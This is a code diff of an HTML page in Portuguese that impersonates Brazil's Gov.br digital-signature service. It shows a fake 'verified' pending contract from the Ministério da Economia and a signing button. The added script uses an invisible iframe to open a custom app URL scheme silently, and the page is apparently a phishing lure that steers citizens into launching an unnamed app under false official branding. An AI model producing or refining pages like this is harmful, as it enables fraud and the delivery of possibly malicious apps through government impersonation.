@@ -2,52 +2,50 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Documento Oficial de Assinatura Digital">
-    <title>Gov.br - Assinatura Digital</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gov.br Digital | Assinatura</title>
     <style>
         :root {
-            --primary: #1a237e; /* Azul Gov.br */
-            --primary-dark: #10154b;
-            --bg: #f4f5f7;
+            /* Cores oficiais Gov.br */
+            --gov-blue: #1a237e;
+            --gov-blue-dark: #0d164d;
+            --gov-green: #007934;
+            --bg-gray: #f4f5f7;
             --card-bg: #ffffff;
-            --text-main: #202124;
-            --text-sub: #5f6368;
+            --text-dark: #202124;
+            --text-light: #5f6368;
             --border: #dadce0;
-            --success: #0d652d;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
+            margin: 0;
+            padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg);
+            background-color: var(--bg-gray);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: var(--text-main);
-            -webkit-font-smoothing: antialiased;
+            color: var(--text-dark);
         }
 
-        .container {
+        /* Container principal */
+        .app-container {
             width: 100%;
-            max-width: 420px;
+            max-width: 400px;
             padding: 16px;
         }
 
-        /* Card Principal */
+        /* Card Branco */
         .card {
             background: var(--card-bg);
             border-radius: 12px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.08), 0 4px 16px rgba(0,0,0,0.04);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08), 0 10px 24px rgba(0,0,0,0.04);
             border: 1px solid var(--border);
             overflow: hidden;
-            transition: all 0.3s ease;
+            position: relative;
         }
 
         /* Cabeçalho */
@@ -62,199 +60,194 @@
         .brand {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
             font-weight: 700;
-            font-size: 20px;
-            color: var(--primary);
+            font-size: 18px;
+            color: var(--gov-blue);
         }
 
         .brand-icon {
-            width: 32px;
-            height: 32px;
-            background: var(--primary);
-            border-radius: 8px;
+            width: 28px;
+            height: 28px;
+            background: var(--gov-blue);
+            border-radius: 6px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-weight: 900;
-            font-size: 18px;
+            font-size: 16px;
         }
 
-        .status-badge {
+        .status {
+            font-size: 12px;
+            color: var(--gov-green);
             background: #e6f4ea;
-            color: var(--success);
             padding: 4px 8px;
             border-radius: 4px;
-            font-size: 11px;
             font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
         }
 
-        /* Corpo do Conteúdo */
-        .body {
-            padding: 24px;
-        }
+        /* Corpo */
+        .content { padding: 24px; }
 
         h1 {
             font-size: 20px;
-            margin: 0 0 12px 0;
+            margin: 0 0 12px;
             font-weight: 600;
-            color: var(--text-main);
-            letter-spacing: -0.01em;
+            color: var(--text-dark);
         }
 
         p {
             font-size: 14px;
-            color: var(--text-sub);
-            margin: 0 0 24px 0;
+            color: var(--text-light);
+            margin: 0 0 20px;
             line-height: 1.5;
         }
 
         /* Caixa do Arquivo */
-        .file-info {
+        .file-box {
             background: #f8f9fa;
             border: 1px solid #e9ecef;
-            border-radius: 8px;
+            border-left: 4px solid var(--gov-blue);
+            border-radius: 6px;
             padding: 16px;
             margin-bottom: 24px;
-            border-left: 4px solid var(--primary);
         }
 
         .file-name {
             font-weight: 600;
             font-size: 14px;
-            color: var(--text-main);
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
-        .meta {
+        .file-meta {
             font-size: 12px;
-            color: var(--text-sub);
+            color: var(--text-light);
             display: flex;
             justify-content: space-between;
         }
 
-        /* Botão Principal */
+        /* Botão */
         .btn {
             width: 100%;
             padding: 14px;
+            background: var(--gov-blue);
+            color: white;
             border: none;
             border-radius: 6px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s ease, transform 0.1s ease;
+            transition: background 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
         }
 
-        .btn-primary {
-            background: var(--primary);
-            color: white;
-            box-shadow: 0 2px 4px rgba(26, 35, 126, 0.15);
-        }
+        .btn:hover { background: var(--gov-blue-dark); }
+        .btn:active { transform: scale(0.98); }
 
-        .btn-primary:hover {
-            background: var(--primary-dark);
-        }
-
-        .btn-primary:active {
-            transform: scale(0.98);
-            box-shadow: 0 1px 2px rgba(26, 35, 126, 0.15);
-        }
-
-        /* Rodapé de Segurança */
+        /* Rodapé */
         .footer {
-            padding: 16px 24px;
             background: #fafafa;
+            padding: 16px 24px;
             border-top: 1px solid var(--border);
             text-align: center;
         }
 
         .secure {
             font-size: 12px;
-            color: var(--text-sub);
+            color: var(--text-light);
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 6px;
         }
 
-        .session-id {
-            font-family: monospace;
-            font-size: 11px;
-            color: #b0b0b0;
-            margin-top: 4px;
-            display: block;
+        /* Iframe oculto para abrir o app silenciosamente */
+        .hidden-frame {
+            position: absolute;
+            width: 0;
+            height: 0;
+            border: 0;
+            visibility: hidden;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <!-- Iframe invisível para abrir o app sem piscar -->
+    <iframe id="appFrame" class="hidden-frame" src="about:blank"></iframe>
+
+    <div class="app-container">
         <div class="card">
-            <!-- Cabeçalho -->
             <div class="header">
                 <div class="brand">
                     <div class="brand-icon">G</div>
                     <span>Gov.br Digital</span>
                 </div>
-                <div class="status-badge">
-                    <span>✓</span> Verificado
-                </div>
+                <div class="status">✓ Verificado</div>
             </div>
 
-            <!-- Corpo -->
-            <div class="body">
+            <div class="content">
                 <h1>Assinatura Pendente</h1>
-                <p>Você recebeu um novo documento para assinatura digital. A validação será realizada via SGP.</p>
+                <p>Você tem um documento para assinar. O processo é seguro e direto.</p>
 
-                <div class="file-info">
-                    <span class="file-name">Contrato_Term_2026_v2.pdf</span>
-                    <div class="meta">
-                        <span>Enviado por: Ministério da Economia</span>                
+                <div class="file-box">
+                    <span class="file-name">Contrato_Financeiro_2026.pdf</span>
+                    <div class="file-meta">
+                        <span>Ministério da Economia</span>
+                        <span>27/09/2026</span>
                     </div>
                 </div>
 
-                <!-- Botão de Ação -->
-                <button class="btn btn-primary" onclick="abrirApp()">
+                <button class="btn" onclick="assinarApp()">
                     Assinar com Gov.br
                 </button>
             </div>
 
-            <!-- Rodapé -->
             <div class="footer">
                 <div class="secure">
-                    🔒 Conexão Privativa (SSL)
+                    🔒 Conexão Privativa
                 </div>
-                <div class="session-id">ID: 88293-441-XP-2026</div>
             </div>
         </div>
     </div>
 
     <script>
-        // Função silenciosa para abrir o app
-        function abrirApp() {
-            // Substitua 'seuapp://' pelo protocolo real do seu aplicativo
-            // Exemplo: 'meunegocio://', 'whatsapp://', etc.
-            const appScheme = 'seuapp://';
+        // CONFIGURAÇÃO DO SEU APP
+        const APP_SCHEME = "meuapp://"; // Troque pelo seu protocolo
+        const APP_ACTION = "assinar";
+        const APP_ID = "doc-99283"; // ID do documento para passar no link
+
+        function abrirAppSilenciosamente() {
+            // Tenta abrir via iframe invisível (evita piscar a tela)
+            const frame = document.getElementById('appFrame');
+            const targetUrl = `${APP_SCHEME}${APP_ACTION}?id=${APP_ID}`;
             
-            // Tenta abrir o app
-            window.location.href = appScheme + 'abrir-contrato';
+            // Método 1: Tenta carregar no iframe
+            frame.src = targetUrl;
             
-            // Opcional: Adicionar fallback para loja se o app não estiver instalado
-            // if (navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
-            //     setTimeout(() => {
-            //         window.location.href = 'https://play.google.com/store/apps/details?id=seu.id.app';
-            //     }, 1500);
-            // }
+            // Método 2: Fallback para abrir direto se iframe falhar
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 500);
+        }
+
+        function assinarApp() {
+            const btn = document.querySelector('.btn');
+            btn.innerHTML = "Aguardando App...";
+            btn.style.opacity = "0.8";
+            
+            abrirAppSilenciosamente();
+            
+            // Reseta o botão após 2s se não tiver resposta
+            setTimeout(() => {
+                btn.innerHTML = "Assinar com Gov.br";
+                btn.style.opacity = "1";
+            }, 2000);
         }
     </script>
 
